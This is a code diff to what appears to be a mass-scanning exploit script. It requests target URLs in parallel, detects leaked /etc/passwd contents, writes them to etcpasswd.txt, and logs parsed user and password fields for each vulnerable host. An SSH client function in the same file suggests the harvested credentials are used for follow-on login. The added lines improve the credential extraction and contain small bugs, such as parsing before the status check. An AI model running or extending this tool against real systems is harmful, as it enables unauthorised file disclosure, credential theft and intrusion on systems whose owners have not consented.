@@ -56,6 +56,7 @@ def checktarget(pattern, url):
                 print('Response successful, there may be a vulnerability in the target address, try to obtain more configuration file information\n')
                 responseinfo = re.findall(r'root', response.text)
                 passwd = response.text.split(":")[1]
+                user = response.text.split(":")[0]
                 if len(responseinfo) != 0:
                     f = open('etcpasswd.txt', 'w')
                     f.write(response.text)
@@ -79,6 +80,7 @@ def checktarget(pattern, url):
         list = openfile(url)
         with ThreadPoolExecutor(max_workers=10) as executor:
             executor.map(batch, list)
+
 
 
 def SSHclient(hostname, password):
@@ -125,12 +127,18 @@ def batch(url):
         f = open('scanresults.txt', 'a')
         response = requests.get(url=url, headers=headers, verify=False, timeout=20)
         state = response.status_code
+        passwd = response.text.split(":")[1]
+        user = response.text.split(":")[0]
+        html = re.findall(r'html', response.text)
         if state == 200:
-            responseinfo = re.findall(r'root', response.text)
-            if len(responseinfo) != 0:
-                print('The current URL may have vulnerabilities, please verify manually：' + url)
-                result = ('The current URL may have vulnerabilities, please verify manually：' + url + '\n')
-                f.write(result)
+            responseinfo = re.findall(passwd, response.text)
+            if len(responseinfo) != 0 :
+                if len(html) == 0:
+                    print('The current URL may have vulnerabilities, please verify manually：' + url)
+                    result = ('The current URL may have vulnerabilities, please verify manually：' + url + '  uxername:' + user + '  password:' + passwd + '\n')
+                    f.write(result)
+                else:
+                    print("There is no vulnerability in the current URL，PASS")
             else:
                 print("There is no vulnerability in the current URL，PASS")
         else:
